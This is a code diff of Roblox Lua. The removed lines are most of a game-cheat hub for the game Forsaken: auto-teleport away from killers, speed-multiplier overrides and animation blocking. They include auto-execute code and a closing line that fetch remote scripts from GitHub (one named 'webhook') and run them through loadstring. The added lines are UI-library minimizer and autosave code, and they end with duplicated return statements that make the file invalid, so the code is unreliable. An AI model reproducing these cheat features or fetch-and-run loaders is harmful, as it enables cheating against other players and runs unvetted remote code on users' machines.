-    or part:FindFirstChildOfClass("AlignOrientation") then
-        return true
-    end
-    return false
-end
-
-local function isPartMoving(part)
-    if not part or not part:IsA("BasePart") then return false end
-    local ok, asmVel = pcall(function() return part.AssemblyLinearVelocity end)
-    local velMag = (ok and asmVel) and asmVel.Magnitude or 0
-    if velMag == 0 then
-        local ok2, v2 = pcall(function() return part.Velocity end)
-        if ok2 and v2 then velMag = v2.Magnitude end
-    end
-    local last = lastPositions[part]
-    local pos = part.Position
-    local moved = false
-    if last then
-        if (pos - last).Magnitude >= MOVE_THRESHOLD then moved = true end
-    else
-        if velMag >= VEL_THRESHOLD or hasForceOnPart(part) then moved = true end
-    end
-    lastPositions[part] = pos
-    if velMag >= VEL_THRESHOLD or hasForceOnPart(part) then moved = true end
-    return moved
-end
-
-local function pruneLastPositions()
-    for inst,_ in pairs(lastPositions) do
-        if not inst or not inst.Parent then lastPositions[inst] = nil end
-    end
-end
-
--- 🔎 Phát hiện nguy hiểm gần
-local function isDangerNear(position, radius)
-    local killersFolder = workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Killers")
-    if killersFolder then
-        for _, killer in ipairs(killersFolder:GetChildren()) do
-            local hrp = killer:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                local dist = (hrp.Position - position).Magnitude
-                if (DangerousKillers[killer.Name] or DangerousClones[killer.Name]) and dist <= radius then
-                    return true, hrp.Position
-                end
-            end
-        end
-    end
-    for _, inst in ipairs(workspace:GetDescendants()) do
-        if inst:IsA("BasePart") and not SafeObjects[inst.Name] then
-            local dist = (inst.Position - position).Magnitude
-            if dist <= radius and isPartMoving(inst) then
-                local charModel, playerOwner = findOwningCharacter(inst)
-                if playerOwner then
-                    local charName = charModel and charModel.Name or ""
-                    if DangerousKillers[charName] or DangerousClones[charName] then
-                        return true, inst.Position
-                    end
-                else
-                    return true, inst.Position
-                end
-            end
-        end
-    end
-    pruneLastPositions()
-    return false, nil
-end
-
--- 📌 Tìm vị trí an toàn cách xa danger 7 stud
-local function getSafePosFromDanger(myPos, dangerPos, safeDist)
-    local dir = (myPos - dangerPos).Unit
-    local target = myPos + dir * safeDist
-    local rayParams = RaycastParams.new()
-    rayParams.FilterDescendantsInstances = {LP.Character}
-    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
-    local rayResult = workspace:Raycast(myPos + Vector3.new(0,3,0), dir*safeDist, rayParams)
-    if rayResult then
-        local perp1 = Vector3.new(-dir.Z,0,dir.X).Unit
-        local perp2 = -perp1
-        if not workspace:Raycast(myPos+Vector3.new(0,3,0), perp1*safeDist, rayParams) then
-            return myPos + perp1*safeDist
-        elseif not workspace:Raycast(myPos+Vector3.new(0,3,0), perp2*safeDist, rayParams) then
-            return myPos + perp2*safeDist
-        else
-            return myPos + Vector3.new(0,0,safeDist)
-        end
-    end
-    return target
-end
-
--- 🚀 Lùi ra xa 7 stud khỏi nguy hiểm (giữ hướng nhìn, bước nhỏ siêu nhanh)
-local function teleportAwayFromDanger()
-    local character = LP.Character
-    local hrp = character and character:FindFirstChild("HumanoidRootPart")
-    if not hrp then return end
-
-    local myPos = hrp.Position
-    local isNear, dangerPos = isDangerNear(myPos, DetectRadius)
-    if isNear and dangerPos then
-        local safePos = getSafePosFromDanger(myPos, dangerPos, 7)
-
-        local dir = (safePos - myPos).Unit
-        local totalDist = (safePos - myPos).Magnitude
-        local stepSize = 1.2
-        local stepDelay = 0.01
-        local steps = math.ceil(totalDist / stepSize)
-
-        for i = 1, steps do
-            local stepPos = myPos + dir * (i * stepSize)
-            hrp.CFrame = CFrame.new(stepPos, stepPos + hrp.CFrame.LookVector)
-            task.wait(stepDelay)
-        end
-
-    end
-end
-
--- === GUI Control ===
-Tabs.Misc:AddToggle("SafeGenTeleport", {
-    Title = "Anti Killers V7",
-    Default = false
-}):OnChanged(function(state)
-    SafeGenRunning = state
-    if state then
-        SafeGenThread = task.spawn(function()
-            local delayTime = SCAN_DELAY
-            if AllowedPlayers[LP.Name] then
-                delayTime = 0.000000000001
-            else
-            end
-            while SafeGenRunning do
-                local character = LP.Character
-                local hrp = character and character:FindFirstChild("HumanoidRootPart")
-                if hrp then
-                    local charName = character.Name
-                    if DangerousKillers[charName] or DangerousClones[charName] then
-                        -- bạn là killer → không né
-                    elseif Survivors[charName] or charName == LP.Name then
-                        teleportAwayFromDanger()
-                    end
-                end
-                task.wait(delayTime)
-            end
-        end)
-    else
-        SafeGenRunning = false
-        SafeGenThread = nil
-    end
-end)
-
--- 📝 Input box chỉnh khoảng cách DetectRadius (1 - 100, mặc định 20)
-Tabs.Misc:AddInput("DetectRadiusInput", {
-    Title = "Detect Radius",
-    Default = "20",
-    Placeholder = "1 - 100"
-}):OnChanged(function(value)
-    local num = tonumber(value)
-    if num then
-        num = math.clamp(num, 1, 100)
-        DetectRadius = num
-    end
-end)
-
-end
-
-
-
-    Tabs.Misc:AddSection("Game Play")
-
-
-
-do
-    --== ⚙️ Setup ==--
-    local Players = game:GetService("Players")
-    local RunService = game:GetService("RunService")
-    local LocalPlayer = Players.LocalPlayer
-    local Survivors = workspace:WaitForChild("Players"):WaitForChild("Survivors")
-
-    --== 💡 Cấu hình các loại Anti-Slow ==--
-    local AntiSlowConfigs = {
-        Slowness = {Values = {"SlowedStatus"}, Connection = nil, Enabled = false},
-        Skills = {
-            Values = {
-                "StunningKiller", "EatFriedChicken", "GuestBlocking", "PunchAbility", "SubspaceTripmine",
-                "TaphTripwire", "PlasmaBeam", "SpawnProtection", "c00lgui", "ShootingGun", 
-                "TwoTimeStab", "TwoTimeCrouching", "DrinkingCola", "DrinkingSlateskin", 
-                "SlateskinStatus", "EatingGhostburger"
-            },
-            Connection = nil, Enabled = false
-        },
-        Items = {Values = {"BloxyColaItem", "Medkit"}, Connection = nil, Enabled = false},
-        Emotes = {Values = {"Emoting"}, Connection = nil, Enabled = false},
-        Builderman = {Values = {"DispenserConstruction", "SentryConstruction"}, Connection = nil, Enabled = false}
-    }
-
-    --== 🧩 Hàm ẩn UI báo slow ==--
-    local function hideSlownessUI()
-        local mainUI = LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("MainUI")
-        if not mainUI then return end
-        local statusContainer = mainUI:FindFirstChild("StatusContainer")
-        if not statusContainer then return end
-        local slownessUI = statusContainer:FindFirstChild("Slowness")
-        if slownessUI then
-            slownessUI.Visible = false
-        end
-    end
-
-    --== 🔧 Hàm xử lý Anti-Slow ==--
-    local function handleAntiSlow(survivor, config)
-        if survivor:GetAttribute("Username") ~= LocalPlayer.Name then return end
-
-        local function onRenderStep()
-            if not survivor.Parent or not config.Enabled then return end
-            local speedMultipliers = survivor:FindFirstChild("SpeedMultipliers")
-            if speedMultipliers then
-                for _, valName in ipairs(config.Values) do
-                    local val = speedMultipliers:FindFirstChild(valName)
-                    if val and val:IsA("NumberValue") and val.Value ~= 1 then
-                        val.Value = 1
-                    end
-                end
-            end
-            hideSlownessUI()
-        end
-
-        config.Connection = RunService.RenderStepped:Connect(onRenderStep)
-    end
-
-    --== ▶️ Bật tất cả Anti-Slow ==--
-    local function startAllAntiSlow()
-        for _, config in pairs(AntiSlowConfigs) do
-            config.Enabled = true
-            for _, survivor in pairs(Survivors:GetChildren()) do
-                handleAntiSlow(survivor, config)
-            end
-            Survivors.ChildAdded:Connect(function(child)
-                task.wait(0.1)
-                handleAntiSlow(child, config)
-            end)
-        end
-    end
-
-    --== ⏹️ Tắt tất cả Anti-Slow ==--
-    local function stopAllAntiSlow()
-        for _, config in pairs(AntiSlowConfigs) do
-            config.Enabled = false
-            if config.Connection then
-                config.Connection:Disconnect()
-                config.Connection = nil
-            end
-        end
-    end
-
-    --== 🧩 Tạo Toggle Fluent UI (chỉ 1 nút tổng) ==--
-    Tabs.Misc:AddToggle("AntiSlow_All", {
-        Title = "Anti-Slow",
-        Default = false
-    }):OnChanged(function(Value)
-        if Value then
-            startAllAntiSlow()
-        else
-            stopAllAntiSlow()
-        end
-    end)
-end
-
-
-
-
-do
-    --== ⚙️ Auto Close 1x1x1x1 Popups + Anti Slow/FOV ==--
-    local DoLoop = false
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    local Workspace = game:GetService("Workspace")
-
-    Tabs.Misc:AddToggle("AutoClosePopupV2", {
-        Title = "Detele 1x Popups",
-        Default = true
-    }):OnChanged(function(Value)
-        DoLoop = Value
-
-        task.spawn(function()
-            local Survivors = Workspace:WaitForChild("Players"):WaitForChild("Survivors")
-
-            while DoLoop and task.wait() do
-                -- 🔹 Auto Close 1x1x1x1 Popups
-                local temp = LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("TemporaryUI")
-                if temp and temp:FindFirstChild("1x1x1x1Popup") then
-                    temp["1x1x1x1Popup"]:Destroy()
-                end
-
-                -- 🔹 Anti Slow + Anti FOV Slow
-                for _, survivor in pairs(Survivors:GetChildren()) do
-                    if survivor:GetAttribute("Username") == LocalPlayer.Name then
-                        -- SpeedMultipliers
-                        local speedMultipliers = survivor:FindFirstChild("SpeedMultipliers")
-                        if speedMultipliers then
-                            local val = speedMultipliers:FindFirstChild("SlowedStatus")
-                            if val and val:IsA("NumberValue") then
-                                val.Value = 1
-                            end
-                        end
-
-                        -- FOVMultipliers
-                        local fovMultipliers = survivor:FindFirstChild("FOVMultipliers")
-                        if fovMultipliers then
-                            local val = fovMultipliers:FindFirstChild("SlowedStatus")
-                            if val and val:IsA("NumberValue") then
-                                val.Value = 1
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-    end)
-end
-
-
-
-    Tabs.Misc:AddSection("Fix Lag")
-
--- SCRIPT GIẢM ĐỒ HỌA TỰ ĐỘNG MỖI 10 GIÂY (CÓ TOGGLE + RESTORE)
--- Dán vào LocalScript (StarterPlayerScripts hoặc executor)
--- Siêu Fix Lag cực mạnh giúp máy bạn mượt hơn 25% khi bật
-
--- Lưu dữ liệu gốc
-local originalLighting = {}
-local originalParts = {}
-
--- Hàm lưu Lighting gốc
-local function saveLighting()
-    originalLighting.QualityLevel = settings().Rendering.QualityLevel
-    originalLighting.GlobalShadows = game.Lighting.GlobalShadows
-    originalLighting.FogEnd = game.Lighting.FogEnd
-    originalLighting.Brightness = game.Lighting.Brightness
-    originalLighting.PostEffects = {}
-    for _, v in ipairs(game.Lighting:GetChildren()) do
-        if v:IsA("PostEffect") then
-            originalLighting.PostEffects[v] = v.Enabled
-        end
-    end
-end
-
--- Hàm khôi phục Lighting
-local function restoreLighting()
-    if not originalLighting.QualityLevel then return end
-    settings().Rendering.QualityLevel = originalLighting.QualityLevel
-    game.Lighting.GlobalShadows = originalLighting.GlobalShadows
-    game.Lighting.FogEnd = originalLighting.FogEnd
-    game.Lighting.Brightness = originalLighting.Brightness
-    for effect, state in pairs(originalLighting.PostEffects) do
-        if effect and effect.Parent == game.Lighting then
-            effect.Enabled = state
-        end
-    end
-end
-
--- Hàm giảm đồ họa triệt để
-local function simplifyModel(obj)
-    if obj:IsA("BasePart") then
-        if not originalParts[obj] then
-            originalParts[obj] = {
-                Material = obj.Material,
-                Color = obj.Color,
-                Reflectance = obj.Reflectance,
-                CastShadow = obj.CastShadow
-            }
-        end
-        obj.Material = Enum.Material.SmoothPlastic
-        obj.Color = Color3.fromRGB(163, 162, 165)
-        obj.Reflectance = 0
-        obj.CastShadow = false
-    elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("SurfaceAppearance") then
-        obj:Destroy()
-    elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
-        obj.Enabled = false
-    end
-end
-
--- Hàm khôi phục BasePart
-local function restoreParts()
-    for part, data in pairs(originalParts) do
-        if part and part.Parent then
-            part.Material = data.Material
-            part.Color = data.Color
-            part.Reflectance = data.Reflectance
-            part.CastShadow = data.CastShadow
-        end
-    end
-    originalParts = {} -- reset
-end
-
--- ==============================
--- Toggle Auto Reduce (10s)
--- ==============================
-local autoThread
-local connection
-
-local AutoReduceToggle = Tabs.Misc:AddToggle("AutoReduce", {
-    Title = "FPS Boost",
-    Default = false,
-    Callback = function(state)
-        if state then
-
-            -- Lưu lighting gốc
-            saveLighting()
-
-            -- Giảm đồ họa lighting khi bật
-            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
-            game.Lighting.GlobalShadows = false
-            game.Lighting.FogEnd = 9e9
-            game.Lighting.Brightness = 1
-            for _, v in ipairs(game.Lighting:GetChildren()) do
-                if v:IsA("PostEffect") then
-                    v.Enabled = false
-                end
-            end
-
-            -- 🔥 Giảm ngay 1 lần đầu tiên
-            for _, obj in ipairs(workspace:GetDescendants()) do
-                simplifyModel(obj)
-            end
-
-            -- Nếu có object spawn thêm thì cũng xử lý
-            connection = workspace.DescendantAdded:Connect(simplifyModel)
-
-            -- Sau đó auto lặp mỗi 10s
-            autoThread = task.spawn(function()
-                while AutoReduceToggle.Value do
-                    task.wait(10)
-                    for _, obj in ipairs(workspace:GetDescendants()) do
-                        simplifyModel(obj)
-                    end
-                end
-            end)
-
-        else
-            if connection then
-                connection:Disconnect()
-                connection = nil
-            end
-
-            -- Khôi phục đồ họa gốc
-            restoreLighting()
-            restoreParts()
-        end
-    end
+local MinimizeButton = New("TextButton", {
+	BackgroundColor3 = Color3.fromRGB(25, 25, 30),
+	Size = UDim2.new(1, 0, 1, 0),
+	BorderSizePixel = 0,
+	BackgroundTransparency = 0.05, 
+}, {
+	New("UICorner", {
+		CornerRadius = UDim.new(0, 14),
+	}),
+	New("UIGradient", {
+		Color = ColorSequence.new{
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 50)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 25))
+		},
+		Rotation = 45,
+	}),
+	New("UIStroke", {
+		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+		Color = Color3.fromRGB(100, 150, 255),
+		Transparency = 0.6,
+		Thickness = 2,
+	}),
+	New("Frame", {
+		BackgroundColor3 = Color3.fromRGB(100, 150, 255),
+		BackgroundTransparency = 0.9,
+		Size = UDim2.new(1, -6, 1, -6),
+		Position = UDim2.new(0, 3, 0, 3),
+		BorderSizePixel = 0,
+	}, {
+		New("UICorner", {
+			CornerRadius = UDim.new(0, 11),
+		}),
+	}),
+	New("Frame", {
+		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+		BackgroundTransparency = 0.94,
+		Size = UDim2.new(0.7, 0, 0.3, 0),
+		Position = UDim2.new(0.15, 0, 0.1, 0),
+		BorderSizePixel = 0,
+	}, {
+		New("UICorner", {
+			CornerRadius = UDim.new(0, 8),
+		}),
+	}),
+	New("ImageLabel", {
+		Image = "rbxassetid://10734897102",
+		Size = UDim2.new(0.8, 0, 0.8, 0),
+		Position = UDim2.new(0.5, 0, 0.5, 0),
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		BackgroundTransparency = 1,
+		ImageColor3 = Color3.fromRGB(255, 255, 255),
+		ImageTransparency = 0.1,
+	}, {
+		New("UIAspectRatioConstraint", {
+			AspectRatio = 1,
+			AspectType = Enum.AspectType.FitWithinMaxSize,
+		})
+	})
 })
 
-
-
--- 🧠 Anti-FPS Spike (Cưỡng chế 60FPS + Tự chống tăng bất thường)
--- Giữ FPS luôn ổn định ở 60, ngăn vọt FPS gây đơ / giật game
-
-local RunService = game:GetService("RunService")
-
-Tabs.Misc:AddToggle("AntiFPSSpike", {
-    Title = "Unlock FPS V2",
-    Default = false
-}):OnChanged(function(Value)
-    _G.AntiFPSSpike = Value
-
-    if Value then
-
-        task.spawn(function()
-            local FORCE_FPS = 60          -- Luôn giữ 60 FPS
-            local SPIKE_THRESHOLD = 120   -- Nếu FPS vượt ngưỡng này thì chống spike
-            local MONITOR_INTERVAL = 1    -- Kiểm tra mỗi 1 giây
-
-            local frameCount = 0
-            local fps = 60
-
-            -- Hàm cưỡng chế FPS
-            local function forceCap()
-                if typeof(setfpscap) == "function" then
-                    setfpscap(FORCE_FPS)
-                end
-            end
-
-            -- Khóa ban đầu
-            forceCap()
-
-            -- Đếm FPS thực tế
-            RunService.RenderStepped:Connect(function()
-                if not _G.AntiFPSSpike then return end
-                frameCount += 1
-            end)
-
-            while _G.AntiFPSSpike and task.wait(MONITOR_INTERVAL) do
-                fps = frameCount / MONITOR_INTERVAL
-                frameCount = 0
-
-                -- Phát hiện FPS tăng bất thường
-                if fps > SPIKE_THRESHOLD then
-                    forceCap()
-                    task.wait(0.5)
-                end
-
-                -- Bảo vệ tránh script khác đổi cap
-                if typeof(getfpscap) == "function" then
-                    local currentCap = getfpscap()
-                    if currentCap ~= FORCE_FPS then
-                        forceCap()
-                    end
-                end
-            end
-
-        end)
-    else
-    end
-end)
-
-
-
--- ======= DỊCH VỤ =======
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
--- ======= DANH SÁCH BLOCK ANIMATION =======
-local blockedAnimations = {
-    ["127802146383565"] = true,
-    ["82691533602949"] = true,
-    ["123764169071995"] = true,
-}
-
--- ======= BIẾN TRẠNG THÁI =======
-local BlockAnimEnabled = false
-local blockConnections = {}
-
--- ======= HÀM =======
-local function hookHumanoid(humanoid)
-    if not humanoid then return end
-    local conn = humanoid.AnimationPlayed:Connect(function(track)
-        local id = track.Animation.AnimationId:match("%d+")
-        if BlockAnimEnabled and blockedAnimations[id] then
-            track:Stop()
-        end
-    end)
-    table.insert(blockConnections, conn)
-end
-
-local function setBlockAnimations(enabled)
-    BlockAnimEnabled = enabled
-
-    -- clear cũ
-    for _, conn in pairs(blockConnections) do
-        conn:Disconnect()
-    end
-    table.clear(blockConnections)
-
-    if enabled then
-        -- nhân vật hiện tại
-        if LocalPlayer.Character then
-            hookHumanoid(LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"))
-        end
-        -- respawn
-        local connChar = LocalPlayer.CharacterAdded:Connect(function(char)
-            char:WaitForChild("Humanoid")
-            hookHumanoid(char:FindFirstChildWhichIsA("Humanoid"))
-        end)
-        table.insert(blockConnections, connChar)
-    end
-end
-
--- ======= TOGGLE FLUENT =======
-Tabs.Misc:AddToggle("BlockBadAnims", {
-    Title = "Block Animations",
-    Default = false
-}):OnChanged(function(v)
-    setBlockAnimations(v)
-end)
-
-
-
-    Tabs.Misc:AddSection("Show")
-
-
-
---// FPS + Ping Display (Safe BillboardGui Version)
-local RunService = game:GetService("RunService")
-local Stats = game:GetService("Stats")
-local Camera = workspace.CurrentCamera
-
---// UI Container
-local ui = Instance.new("ScreenGui")
-ui.Name = "FPS_Ping_Display"
-ui.ResetOnSpawn = false
-ui.IgnoreGuiInset = true
-ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-ui.Parent = game:GetService("CoreGui")
-
---// FPS Label
-local fpsLabel = Instance.new("TextLabel")
-fpsLabel.Size = UDim2.new(0, 120, 0, 20)
-fpsLabel.Position = UDim2.new(1, -130, 0, 5)
-fpsLabel.BackgroundTransparency = 1
-fpsLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-fpsLabel.TextStrokeTransparency = 0
-fpsLabel.TextSize = 16
-fpsLabel.Font = Enum.Font.Code
-fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
-fpsLabel.Text = "FPS: ..."
-fpsLabel.Parent = ui
-
---// Ping Label
-local pingLabel = fpsLabel:Clone()
-pingLabel.Position = UDim2.new(1, -130, 0, 25)
-pingLabel.Text = "Ping: ..."
-pingLabel.Parent = ui
-
---// Variables
-local showFPS = true
-local showPing = true
-local fpsCounter, lastUpdate = 0, tick()
-
---// Update Loop
-RunService.RenderStepped:Connect(function()
-    fpsCounter += 1
-    if tick() - lastUpdate >= 1 then
-        if showFPS then
-            fpsLabel.Visible = true
-            fpsLabel.Text = "FPS: " .. tostring(fpsCounter)
-        else
-            fpsLabel.Visible = false
-        end
-
-        if showPing then
-            local pingStat = Stats.Network.ServerStatsItem["Data Ping"]
-            local ping = pingStat and math.floor(pingStat:GetValue()) or 0
-            pingLabel.Text = "Ping: " .. ping .. " ms"
-            if ping <= 60 then
-                pingLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-            elseif ping <= 120 then
-                pingLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
-            else
-                pingLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-            end
-            pingLabel.Visible = true
-        else
-            pingLabel.Visible = false
-        end
-
-        fpsCounter = 0
-        lastUpdate = tick()
-    end
-end)
-
---// Fluent UI Toggles
-local fpsToggle = Tabs.Misc:AddToggle("ShowFPSToggle", {
-    Title = "Show FPS",
-    Default = true
+local MobileMinimizeButton = New("TextButton", {
+	BackgroundColor3 = Color3.fromRGB(25, 25, 30),
+	Size = UDim2.new(1, 0, 1, 0),
+	BorderSizePixel = 0,
+	BackgroundTransparency = 0.05,
+}, {
+	New("UICorner", {
+		CornerRadius = UDim.new(0, 12),
+	}),
+	New("UIGradient", {
+		Color = ColorSequence.new{
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 50)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 25))
+		},
+		Rotation = 45,
+	}),
+	New("UIStroke", {
+		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+		Color = Color3.fromRGB(100, 150, 255),
+		Transparency = 0.7,
+		Thickness = 1.5,
+	}),
+	New("Frame", {
+		BackgroundColor3 = Color3.fromRGB(100, 150, 255),
+		BackgroundTransparency = 0.92,
+		Size = UDim2.new(1, -4, 1, -4),
+		Position = UDim2.new(0, 2, 0, 2),
+		BorderSizePixel = 0,
+	}, {
+		New("UICorner", {
+			CornerRadius = UDim.new(0, 10),
+		}),
+	}),
+	New("ImageLabel", {
+		Image = "rbxassetid://10734897102",
+		Size = UDim2.new(0.8, 0, 0.8, 0),
+		Position = UDim2.new(0.5, 0, 0.5, 0),
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		BackgroundTransparency = 1,
+		ImageColor3 = Color3.fromRGB(255, 255, 255),
+		ImageTransparency = 0.1,
+	}, {
+		New("UIAspectRatioConstraint", {
+			AspectRatio = 1,
+			AspectType = Enum.AspectType.FitWithinMaxSize,
+		})
+	})
 })
-fpsToggle:OnChanged(function(val)
-    showFPS = val
-    fpsLabel.Visible = val
+
+local Minimizer
+
+local isDragging = false
+local dragStart = nil
+local dragOffset = nil
+
+Creator.AddSignal(MinimizeButton.InputBegan, function(Input)
+	if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+		isDragging = true
+		dragStart = Vector2.new(Input.Position.X, Input.Position.Y)
+		dragOffset = (Library.Minimizer or Minimizer).Position
+
+		local connection
+		connection = Input.Changed:Connect(function()
+			if Input.UserInputState == Enum.UserInputState.End then
+				isDragging = false
+				dragStart = nil
+				dragOffset = nil
+				connection:Disconnect()
+			end
+		end)
+	end
 end)
 
-local pingToggle = Tabs.Misc:AddToggle("ShowPingToggle", {
-    Title = "Show Ping",
-    Default = true
-})
-pingToggle:OnChanged(function(val)
-    showPing = val
-    pingLabel.Visible = val
+Creator.AddSignal(MobileMinimizeButton.InputBegan, function(Input)
+	if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+		isDragging = true
+		dragStart = Vector2.new(Input.Position.X, Input.Position.Y)
+		dragOffset = (Library.Minimizer or Minimizer).Position
+		local connection
+		connection = Input.Changed:Connect(function()
+			if Input.UserInputState == Enum.UserInputState.End then
+				isDragging = false
+				dragStart = nil
+				dragOffset = nil
+				connection:Disconnect()
+			end
+		end)
+	end
 end)
 
+local debugCount = 0
+Creator.AddSignal(RunService.Heartbeat, function()
+	local activeMin = Library.Minimizer or Minimizer
+	if isDragging and dragStart and dragOffset and activeMin and activeMin.Parent then
+		debugCount = debugCount + 1
+		if debugCount % 30 == 1 then
+		end
+		local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
+		local currentMousePos = Vector2.new(Mouse.X, Mouse.Y)
+		local delta = currentMousePos - dragStart
+		local newX = dragOffset.X.Offset + delta.X
+		local newY = dragOffset.Y.Offset + delta.Y
+		local viewportSize = workspace.Camera.ViewportSize
+		local minimizerSize = activeMin.AbsoluteSize
 
+		if newX < 0 then newX = 0 end
+		if newY < 0 then newY = 0 end
+		if newX > viewportSize.X - minimizerSize.X then 
+			newX = viewportSize.X - minimizerSize.X 
+		end
+		if newY > viewportSize.Y - minimizerSize.Y then 
+			newY = viewportSize.Y - minimizerSize.Y 
+		end
+		activeMin.Position = UDim2.new(0, newX, 0, newY)
+	end
+end)
 
+AddSignal(MinimizeButton.MouseButton1Click, function()
+	task.wait(0.1)
+	if not isDragging then
+		Library.Window:Minimize()
+	end
+end)
 
-do
-    --== 💬 Chat Visibility Controller ==--
-    getgenv().chatWindow = game:GetService("TextChatService"):WaitForChild("ChatWindowConfiguration")
-    getgenv().chatEnabled = false
-    getgenv().chatConnection = nil
+AddSignal(MobileMinimizeButton.MouseButton1Click, function()
+	task.wait(0.1)
+	if not isDragging then
+		Library.Window:Minimize()
+	end
+end)
 
-    Tabs.Misc:AddToggle("ChatVisibilityToggle", {
-        Title = "Show Chat",
-        Default = false
-    }):OnChanged(function(Value)
-        getgenv().chatEnabled = Value
+task.wait(0.01)
 
-        -- Nếu bật → bật chat và kết nối Heartbeat
-        if Value then
-            if not getgenv().chatConnection then
-                getgenv().chatConnection = game:GetService("RunService").Heartbeat:Connect(function()
-                    if getgenv().chatWindow then
-                        getgenv().chatWindow.Enabled = true
-                    end
-                end)
-            end
-        else
-            -- Nếu tắt → ngắt kết nối và ẩn chat
-            if getgenv().chatConnection then
-                getgenv().chatConnection:Disconnect()
-                getgenv().chatConnection = nil
-            end
-            if getgenv().chatWindow then
-                getgenv().chatWindow.Enabled = false
-            end
-        end
-    end)
+local PlayerName = game.Players.LocalPlayer.Name
+
+local lastSave = 0
+local function AutoSave()
+    if tick() - lastSave < 2 then return end
+    lastSave = tick()
+    task.spawn(function() pcall(SaveManager.Save, SaveManager, PlayerName) end)
 end
 
-
-
-
--- Tabs.Settings
-
-
-local AexecToggle = Tabs.Settings:AddToggle("AexecToggle", {Title = "Auto Execute", Default = false })
-AexecToggle:OnChanged(function(Value)
-    if Value then
-        task.spawn(function()
-            pcall(function()
-                if queue_on_teleport then
-                    local HutaoHubScript1 = [[
-task.wait(3)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/npmc_/refs/heads/main/LagCatForsaken.lua"))()
-]]
-                    queue_on_teleport(HutaoHubScript1)
-                end
-            end)
-        end)
-        Fluent:Notify({
-            Title = "Lag Cat HUB",
-            Content = "Auto execute is enabled!",
-            Duration = 5
-        })
-    else
-        Fluent:Notify({
-            Title = "Lag Cat HUB",
-            Content = "Auto execute is disabled!",
-            Duration = 5
-        })
+for _, elementType in pairs({"Toggle", "Slider", "Dropdown", "Input", "Colorpicker"}) do
+    local original = Library.Elements["Add" .. elementType]
+    Library.Elements["Add" .. elementType] = function(self, idx, config)
+        local origCallback = config.Callback or function() end
+        config.Callback = function(v)
+            origCallback(v)
+            AutoSave()
+        end
+        return original(self, idx, config)
     end
-end)
+end
 
-SaveManager:SetLibrary(Fluent)
-InterfaceManager:SetLibrary(Fluent)
+local origKeybind = Library.Elements.AddKeybind
+Library.Elements.AddKeybind = function(self, idx, config)
+    local origChanged = config.ChangedCallback or function() end
+    config.ChangedCallback = function(v)
+        origChanged(v)
+        AutoSave()
+    end
+    return origKeybind(self, idx, config)
+end
 
--- Ignore keys that are used by ThemeManager.
--- (we dont want configs to save themes, do we?)
-SaveManager:IgnoreThemeSettings()
+return Library, SaveManager, InterfaceManager, Mobile
 
--- You can add indexes of elements the save manager should ignore
-SaveManager:SetIgnoreIndexes({})
 
--- use case for doing it this way:
--- a script hub could have themes in a global folder
--- and game configs in a separate folder per game
-InterfaceManager:SetFolder("LagCat HUB")
-SaveManager:SetFolder("LagCat HUB/Forsaken")
 
-InterfaceManager:BuildInterfaceSection(Tabs.Settings)
-SaveManager:BuildConfigSection(Tabs.Settings)
+task.wait(0.01)
 
--- Select First Tab By Default
-Window:SelectTab(1)
-
-Fluent:Notify({ Title = "LagCat HUB", Content = "forsaken script loaded successfully!", Duration = 5 })
-SaveManager:LoadAutoloadConfig()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/lol/refs/heads/main/webhook"))()
+return Library, SaveManager, InterfaceManager, Mobile
